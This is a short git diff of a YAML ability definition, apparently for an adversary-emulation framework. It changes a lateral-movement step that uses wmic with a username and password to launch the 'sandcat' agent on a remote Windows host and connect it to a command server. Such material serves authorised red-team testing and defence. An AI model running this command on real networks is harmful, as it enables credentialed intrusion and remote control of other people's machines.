@@ -1,7 +1,7 @@
 ---
 
 - id: 2a32e46f-5346-45d3-9475-52b857c05342
-  name: WMIC RAT
+  name: Start 54ndc47 (WMI)
   description: Remotely executes 54ndc47 over WMI
   tactic: lateral-movement
   technique:
@@ -9,6 +9,6 @@
     name: Windows Management Instrumentation
   platforms:
     windows:
-      psh:
+      cmd:
         command: |
-          wmic /node:#{remote.network.ip} /user:#{user.name}@#{network.domain} /password:#{user.password} process call create "cmd /c powershell.exe C:\sandcat.go-windows"
+          wmic /node:#{remote.network.ip} /user:#{user.name}@#{network.domain} /password:#{user.password} process call create "cmd /c C:\sandcat.exe -server #{server} -executor cmd"
